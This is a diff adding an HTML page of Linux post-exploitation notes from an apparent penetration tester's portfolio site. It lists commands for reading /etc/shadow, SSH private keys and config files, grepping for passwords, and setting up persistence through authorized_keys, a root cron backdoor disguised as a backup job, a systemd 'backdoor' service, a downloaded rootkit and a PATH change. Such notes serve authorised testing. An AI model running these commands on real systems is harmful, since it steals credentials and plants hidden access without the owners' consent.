@@ -1,0 +1,282 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Linux Post Exploitation</title>
+  <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+  <link rel="stylesheet" href="/assets/css/style.css">
+  <!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Linux Post Exploitation | Vault-Tec Terminal</title>
+<meta name="generator" content="Jekyll v4.3.4" />
+<meta property="og:title" content="Linux Post Exploitation" />
+<meta name="author" content="RedTeamer403" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Professional penetration tester portfolio" />
+<meta property="og:description" content="Professional penetration tester portfolio" />
+<link rel="canonical" href="http://localhost:4000/notes/linux/post/" />
+<meta property="og:url" content="http://localhost:4000/notes/linux/post/" />
+<meta property="og:site_name" content="Vault-Tec Terminal" />
+<meta property="og:type" content="website" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Linux Post Exploitation" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"WebPage","author":{"@type":"Person","name":"RedTeamer403"},"description":"Professional penetration tester portfolio","headline":"Linux Post Exploitation","url":"http://localhost:4000/notes/linux/post/"}</script>
+<!-- End Jekyll SEO tag -->
+
+</head>
+<body>
+  <div id="init-screen" class="init-screen">
+    <div class="init-content">
+      <div class="init-step">Initializing VAULT-TEC OS...</div>
+      <div class="init-step">Loading security protocols...</div>
+      <div class="init-step">Establishing secure connection...</div>
+      <div class="init-step">Connection established.</div>
+      <div class="init-step">SYSTEM READY</div>
+    </div>
+  </div>
+
+  <div id="main-content" class="main-content hidden">
+    <header>
+      <div class="container">
+        <h1>Vault-Tec Terminal</h1>
+        <nav>
+          <a href="/" >ABOUT</a>
+          <a href="/posts" >POSTS</a>
+          <a href="/notes" class="active">NOTES</a>
+          <a href="/tools" >TOOLS</a>
+        </nav>
+      </div>
+    </header>
+
+    <main class="container">
+      <div class="search-container">
+        <input type="text" class="search-input" placeholder="Search notes...">
+      </div>
+      <div class="notes-container">
+        <div class="notes-sidebar">
+          <div class="notes-category">
+            <h3>CheatSheets</h3>
+            <div class="notes-subcategory">
+              <a href="/notes/cheat/curl/" >CURL</a>
+              <a href="/notes/cheat/DNS/" >DNS</a>
+              <a href="/notes/cheat/file/" >File Transfer</a>
+              <a href="/notes/cheat/hydra/" >Hydra</a>
+              <a href="/notes/cheat/john/" >JohnTheRipper</a>
+              <a href="/notes/cheat/ncat/" >NCAT</a>
+              <a href="/notes/cheat/nmap/" >NMAP</a>
+              <a href="/notes/cheat/shell/" >Reverse Shell</a>
+            </div>
+          </div>
+
+          <div class="notes-category">
+            <h3>Active Directory</h3>
+            <div class="notes-subcategory">
+              <a href="/notes/ad/enum/" >Domain Enumeration</a>
+              <a href="/notes/ad/attack/" >Attack Vectors</a>
+              <a href="/notes/ad/persist/" >Persistence</a>
+              <a href="/notes/ad/lateral/" >Lateral Movement</a>
+            </div>
+          </div>
+          
+          <div class="notes-category">
+            <h3>Cloud</h3>
+            <div class="notes-subcategory">
+              <a href="/notes/cloud/aws/" >AWS</a>
+              <a href="/notes/cloud/azure/" >Azure</a>
+              <a href="/notes/cloud/google/" >Google</a>
+              <a href="/notes/cloud/terra/" >Terraform</a>
+            </div>
+          </div>
+
+          <div class="notes-category">
+            <h3>Container</h3>
+            <div class="notes-subcategory">
+              <a href="/notes/container/docker/" >Docker</a>
+              <a href="/notes/container/k8s/" >Kubernetes</a>
+            </div>
+          </div>
+
+          <div class="notes-category">
+            <h3>Linux</h3>
+            <div class="notes-subcategory">
+              <a href="/notes/linux/enum/" >Enumeration</a>
+              <a href="/notes/linux/privesc/" >Privilege Escalation</a>
+              <a href="/notes/linux/post/" class="active">Post Exploitation</a>
+              <a href="/notes/linux/checklist/" >Penetration Testing Checklist</a>
+              <a href="/notes/linux/tools/" >Tools</a>
+            </div>
+          </div>
+
+          <div class="notes-category">
+            <h3>Network</h3>
+            <div class="notes-subcategory">
+              <a href="/notes/network/recon/" >Reconnaissance</a>
+              <a href="/notes/network/scan/" >Port Scanning</a>
+              <a href="/notes/network/pivot/" >Pivoting</a>
+              <a href="/notes/network/sniff/" >Traffic Analysis</a>
+              <a href="/notes/network/exfil/" >Data Exfiltration</a>
+            </div>
+          </div>
+
+          <div class="notes-category">
+            <h3>Tech Stack</h3>
+            <div class="notes-subcategory">
+              <a href="/notes/tech/cms/" >CMS</a>
+              <a href="/notes/tech/db/" >Databases</a>
+              <a href="/notes/tech/devops/" >DevOps</a>
+              <a href="/notes/tech/enterprise/" >Enterprise Apps</a>
+              <a href="/notes/tech/iam/" >IAM</a>
+              <a href="/notes/tech/mon/" >Monitoring</a>
+              <a href="/notes/tech/open/" >Open-Source</a>
+              <a href="/notes/tech/server/" >Servers</a>
+              <a href="/notes/tech/util/" >Utilities</a>
+            </div>
+          </div>
+
+          <div class="notes-category">
+            <h3>Windows</h3>
+            <div class="notes-subcategory">
+              <a href="/notes/windows/enum/" >Enumeration</a>
+              <a href="/notes/windows/privesc/" >Privilege Escalation</a>
+              <a href="/notes/windows/post/" >Post Exploitation</a>
+              <a href="/notes/windows/av/" >AV/EDR Evasion</a>
+            </div>
+          </div>
+
+          <div class="notes-category">
+            <h3>Web Application</h3>
+            <div class="notes-subcategory">
+              <a href="/notes/web/recon/" >Reconnaissance</a>
+              <a href="/notes/web/vulns/" >Common Vulnerabilities</a>
+              <a href="/notes/web/auth/" >Authentication Bypass</a>
+              <a href="/notes/web/api/" >API Testing</a>
+            </div>
+          </div>
+        </div>
+
+        <div class="notes-content">
+          <div id="search-results"></div>
+          <div id="note-content">
+            <h1 id="linux-post-exploitation">Linux Post Exploitation</h1>
+
+<h2 id="data-collection">Data Collection</h2>
+
+<h3 id="sensitive-files">Sensitive Files</h3>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Common locations</span>
+/etc/shadow
+/etc/passwd
+/etc/ssh/ssh_host_<span class="k">*</span>
+/home/<span class="k">*</span>/.ssh/id_<span class="k">*</span>
+/root/.ssh/id_<span class="k">*</span>
+
+<span class="c"># Find additional sensitive files</span>
+find / <span class="nt">-name</span> <span class="s2">"*.pem"</span> 2&gt;/dev/null
+<span class="nb">grep</span> <span class="nt">-r</span> <span class="s2">"password"</span> / 2&gt;/dev/null
+<span class="nb">cat</span> /var/www/html/config.php
+<span class="nb">cat</span> /etc/nginx/nginx.conf
+<span class="nb">cat</span> /etc/apache2/sites-enabled/<span class="k">*</span>
+</code></pre></div></div>
+
+<h3 id="network-information">Network Information</h3>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Gather network data</span>
+ip neighbor
+route <span class="nt">-n</span>
+<span class="nb">cat</span> /etc/hosts
+<span class="nb">cat</span> /etc/resolv.conf
+
+<span class="c"># External network mapping</span>
+nmap <span class="nt">-sn</span> &lt;network&gt;
+
+<span class="c"># Check DNS for pivoting</span>
+dig &lt;domain&gt;
+</code></pre></div></div>
+
+<h3 id="process-information">Process Information</h3>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ps auxf
+pstree <span class="nt">-a</span>
+lsof <span class="nt">-i</span>
+
+<span class="c"># Check scheduled tasks</span>
+crontab <span class="nt">-l</span>
+<span class="nb">cat</span> /etc/cron.<span class="k">*</span>
+<span class="nb">cat</span> /etc/cron.d/<span class="k">*</span>
+
+<span class="c"># Real-time process monitoring</span>
+pspy64: <span class="sb">`</span>./pspy64<span class="sb">`</span>
+</code></pre></div></div>
+
+<h2 id="persistence-techniques">Persistence Techniques</h2>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Generate SSH key</span>
+ssh-keygen <span class="nt">-t</span> rsa <span class="nt">-b</span> 4096
+
+<span class="c"># Copy public key</span>
+<span class="nb">echo</span> <span class="s2">"your_public_key"</span> <span class="o">&gt;&gt;</span> /root/.ssh/authorized_keys
+<span class="nb">echo</span> <span class="s2">"your_public_key"</span> <span class="o">&gt;&gt;</span> /home/user/.ssh/authorized_keys
+
+<span class="c"># Modify SSH config</span>
+<span class="nb">echo</span> <span class="s2">"AllowUsers yourusername"</span> <span class="o">&gt;&gt;</span> /etc/ssh/sshd_config
+ssh-copy-id user@target
+</code></pre></div></div>
+
+<h3 id="cron-jobs">Cron Jobs</h3>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Add persistent cron job</span>
+<span class="nb">echo</span> <span class="s2">"* * * * * /path/to/backdoor"</span> <span class="o">&gt;&gt;</span> /var/spool/cron/crontabs/root
+
+<span class="c"># Mask cron job as legit task</span>
+<span class="nb">echo</span> <span class="s2">"0 0 * * * /usr/bin/backup.sh"</span> <span class="o">&gt;&gt;</span> /etc/cron.daily/backup
+
+<span class="c"># Verify cron jobs</span>
+crontab <span class="nt">-u</span> root <span class="nt">-l</span>
+</code></pre></div></div>
+
+<h3 id="service-creation">Service Creation</h3>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Create systemd service</span>
+<span class="nb">cat</span> <span class="o">&gt;</span> /etc/systemd/system/backdoor.service <span class="o">&lt;&lt;</span> <span class="no">EOF</span><span class="sh">
+[Unit]
+Description=Backdoor Service
+
+[Service]
+ExecStart=/path/to/backdoor
+
+[Install]
+WantedBy=multi-user.target
+</span><span class="no">EOF
+
+</span><span class="c"># Enable and start service</span>
+systemctl <span class="nb">enable </span>backdoor.service
+systemctl start backdoor.service
+
+<span class="c"># Check service status</span>
+systemctl status backdoor.service
+</code></pre></div></div>
+
+<h3 id="rootkit-installation">Rootkit Installation</h3>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Install simple rootkit (example: chkrootkit or knark)</span>
+wget &lt;rootkit_url&gt; <span class="nt">-O</span> rootkit.tar.gz
+<span class="nb">tar</span> <span class="nt">-xzf</span> rootkit.tar.gz
+<span class="nb">cd </span>rootkit
+make <span class="nb">install</span>
+</code></pre></div></div>
+
+<h3 id="environmental-variables">Environmental Variables</h3>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Add persistent environment variable</span>
+<span class="nb">echo</span> <span class="s2">"export PATH=</span><span class="nv">$PATH</span><span class="s2">:/path/to/backdoor"</span> <span class="o">&gt;&gt;</span> /root/.bashrc
+</code></pre></div></div>
+
+          </div>
+        </div>
+      </div>
+    </main>
+
+    <div class="system-info">
+      <div class="terminal-time"></div>
+      <div class="location-info"></div>
+    </div>
+  </div>
+
+  <script src="/assets/js/main.js"></script>
+</body>
+</html>
